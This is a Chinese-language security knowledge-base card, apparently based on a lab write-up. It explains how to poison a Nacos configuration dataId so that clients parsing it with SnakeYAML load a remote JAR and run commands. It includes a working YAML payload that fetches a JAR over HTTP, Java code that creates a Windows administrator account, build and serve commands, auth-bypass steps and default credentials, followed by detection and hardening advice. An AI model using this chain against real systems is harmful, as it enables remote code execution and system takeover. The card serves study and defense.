---
id: web-java-deser-nacos-config-yaml-snakeyaml-yaml-payload-rce
title: Nacos 配置中心写入 YAML 触发客户端 SnakeYAML 反序列化：ScriptEngineManager 加载远程 yaml-payload JAR 执行命令
type: scenario
domain: web
path: web/java/deserialization
technique: nacos-config-yaml-snakeyaml-deserialization-rce
aliases:
- Nacos YAML 反序列化
- Nacos 配置中心 RCE
- yaml-payload
- SnakeYAML ScriptEngineManager Nacos
- dataId 投毒
- Nacos-Client Yaml 反序列化
tags:
- java
- nacos
- yaml
- snakeyaml
- deserialization
- scriptenginemanager
- urlclassloader
- config-center
- rce
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-12'
updated: '2026-11-12'
verification:
  verified_by: verifier-V574
  verified_at: '2026-11-12T10:57:24+08:00'
  notes: 已对照12906原文与全部56图核对（45/46为同一张Grafana首页截图，无读取失败）：图18/19显示Nacos 1.4.1配置列表dataId=db-config/DEFAULT_GROUP；图16/17为v1 auth bypass枚举用户与创建test用户；图20 NacosRce内存马注入因sun.misc.BASE64Encoder缺失失败；图21/24/25 yaml-payload编译打包（META-INF/services/javax.script.ScriptEngineFactory）、构造方法由dig/Calculator改为net user qwq/add与localgroup administrators；图23/26 Nacos漏洞综合利用工具v4.0选择Nacos-Client Yaml反序列化模块写入dataId，内网HTTP服务收到172.30.12.6对yaml-payload.jar的GET 200；图27 RDP 172.30.12.6取flag02，证明客户端解析恶意YAML并执行命令。卡片原理（配置中心写权限+客户端SnakeYAML默认构造器解析）、利用步骤、yaml-payload代码与原文一致；原文未给受影响版本区间（Nacos 1.4.1为靶场环境版本），affected_versions已空缺符合规范。dedup：与TarzanCMS(theme.yaml上传)、Spring Actuator(bootstrap.location)、DolphinScheduler(loadAs)共用ScriptEngineManager/URLClassLoader gadget但入口、触发条件与PoC均不同，非同链；库内无其他Nacos配置YAML反序列化卡，保留合理。frontmatter无sources字段与库内既有已核验卡一致。PoC未复跑。
---

## 一句话结论

当业务应用通过 Nacos 配置中心拉取并直接用 SnakeYAML 的 `new Yaml().load()` 解析某个 dataId 的 YAML 配置时，攻击者只要取得 Nacos 配置写权限（默认鉴权关闭、默认 token 密钥、认证绕过或弱口令），把 `!!javax.script.ScriptEngineManager` + `!!java.net.URLClassLoader` 的 YAML 写入该 dataId，客户端刷新/重启配置时就会远程加载攻击者 JAR 中的 ScriptEngineFactory 并执行其构造方法，形成 RCE。

## 原理

- **配置即代码入口**：Nacos 把配置按 `dataId + group` 存储；客户端（如 spring-cloud-starter-alibaba-nacos-config）启动或监听变更时拉取配置内容。若应用把 YAML 配置交给 `new Yaml().load(content)`（SnakeYAML 1.x 默认构造器），YAML 中的 `!!` 标签会被实例化为任意 Java 类，等价于反序列化。
- **yaml-payload 链**：`!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://host/yaml-payload.jar"]]]]` 让 SnakeYAML 构造 `ScriptEngineManager`；其构造函数通过 `ServiceLoader` 扫描 `META-INF/services/javax.script.ScriptEngineFactory`，从攻击者 JAR 载入并实例化 `AwesomeScriptEngineFactory`，构造方法/静态块中的 `Runtime.exec` 随即执行。
- **为什么需要配置刷新**：客户端通常在启动时加载配置，并对 dataId 注册监听；写入后若应用未及时刷新，需要触发 `/actuator/refresh`、Spring Cloud 配置刷新事件或等待应用重启，payload 才会被解析。
- **JAR 可达性**：目标往往不出网，因此 yaml-payload.jar 需放在目标能访问的内网主机（如已控跳板）并用 HTTP 提供；把 URL 写成该内网地址，由目标主动请求。
- **前置权限**：Nacos 默认 `nacos.core.auth.enabled=false`、默认 token 密钥可伪造 JWT、或存在 User-Agent/末尾斜杠等认证绕过时，攻击者无需真实管理员即可创建用户或直接调用配置 API；拿到写权限后即可投毒。
- 该链的根因是「配置中心写权限」与「客户端对配置内容做不安全反序列化」的叠加；配置中心常被当作可信基础设施，客户端对配置内容缺少类型白名单。

## 触发条件

- 目标应用使用 Nacos 作为配置中心，且某个 dataId（如 `db-config`）的 YAML 内容由客户端用 SnakeYAML 默认构造器解析。
- 攻击者具备该 dataId 的写权限：Nacos 鉴权未开启、默认 token 密钥可伪造、存在认证绕过，或拿到管理员/弱口令。
- 目标能访问 yaml-payload.jar 的 URL（内网 HTTP 服务即可）。
- 配置变更能被客户端加载（监听刷新或应用重启）。

## 利用步骤

1. 获取 Nacos 写权限：尝试默认鉴权关闭、默认 token 密钥伪造 JWT、`User-Agent: Nacos-Server`/末尾斜杠等认证绕过，或弱口令 `nacos/nacos`；必要时创建新用户登录。
2. 在配置列表中找到业务正在使用的 dataId（如 `db-config`，group `DEFAULT_GROUP`），确认其会被客户端作为 YAML 解析。
3. 制作 yaml-payload：实现 `ScriptEngineFactory` 并在构造方法中执行命令（如 Windows 下 `net user qwq Qq123456. /add` 与 `net localgroup administrators qwq /add`），编译后用 jar 打包（含 `META-INF/services/javax.script.ScriptEngineFactory`）。
4. 把 JAR 上传到目标可达的内网主机，启动 HTTP 服务提供 `yaml-payload.jar`。
5. 向该 dataId 写入恶意 YAML（内容中的 URL 指向第 4 步的 JAR）。
6. 触发客户端刷新配置或等待重启；观察 HTTP 日志中出现目标对 `yaml-payload.jar` 的请求，确认构造方法执行、命令生效（如新增管理员后可 RDP 登录）。
7. 测试结束后恢复原配置，清理新增账号与 JAR。

## PoC

恶意 YAML（写入 Nacos dataId）：

```yaml
!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL ["http://<internal-host>:<port>/yaml-payload.jar"]
  ]]
]
```

yaml-payload 的关键代码（构造方法执行命令）：

```java
package artsploit;
public class AwesomeScriptEngineFactory implements javax.script.ScriptEngineFactory {
    public AwesomeScriptEngineFactory() {
        try {
            Runtime.getRuntime().exec("net user qwq Qq123456. /add");
            Runtime.getRuntime().exec("net localgroup administrators qwq /add");
        } catch (Exception e) { e.printStackTrace(); }
    }
    // 其余 ScriptEngineFactory 接口方法返回默认值
}
```

打包与发布：

```bash
javac src/artsploit/AwesomeScriptEngineFactory.java
jar -cvf yaml-payload.jar -C src/ .
# 在目标可达的内网主机提供 JAR
python3 -m http.server 8000
# 通过 Nacos 配置 API 写入（需对应访问凭据/绕过）
# POST /nacos/v1/cs/configs  dataId=db-config&group=DEFAULT_GROUP&content=<URL 编码的 YAML>
```

说明：原文在 Nacos 1.4.1 环境中通过 YAML 反序列化模块写入 dataId `db-config`，HTTP 日志出现目标 `GET /yaml-payload.jar 200`，随后改命令新增管理员并成功 RDP；本库未复跑。

## 变体与关联

- 变体：YAML 可换成其他 SnakeYAML gadget（`!!javax.script.ScriptEngineManager` 之外的历史 gadget），或目标改用 Fastjson/Jackson 解析配置。
- 变体：配置中心换成 Apollo、Spring Cloud Config、Consul KV 等，只要客户端对配置内容做不安全反序列化，思路相同。
- 关联：[[web-java-deser-tarzancms-snakeyaml-scriptenginemanager-rce]]（同一 yaml-payload gadget，主题文件上传入口）、[[web-java-framework-spring-actuator-bootstrap-location-yaml-rce]]（Spring Actuator 注入远程 YAML 入口）、[[web-java-component-nacos-authfilter-trailing-slash-uri-lookup-bypass]]、[[web-java-component-nacos-default-token-secret-key-jwt-forge]]、[[web-java-component-nacos-default-auth-disabled-user-admin]]（获取 Nacos 写权限的前置手法）。
- 边界：客户端使用 SnakeYAML 2.x SafeConstructor/类型白名单、配置未走 YAML 解析、目标无法访问 JAR URL、或配置刷新不触发时链不成立。

## 检测与防御

- 检测：Nacos 配置变更审计中出现含 `!!javax.script.ScriptEngineManager`/`!!java.net.URLClassLoader`/`yaml-payload` 的内容；客户端向内外网地址请求 `yaml-payload.jar`；配置 dataId 被非管理员账号修改；新增本地管理员账号。
- 防御：Nacos 开启鉴权并修改默认 token 密钥、删除默认账号；按命名空间/dataId 做最小写权限与审计告警。
- 加固：客户端使用 SnakeYAML 2.x 的 SafeConstructor 或显式类型白名单，禁止对配置做默认构造器反序列化；限制应用出站访问，JAR/远程类加载一律禁止。
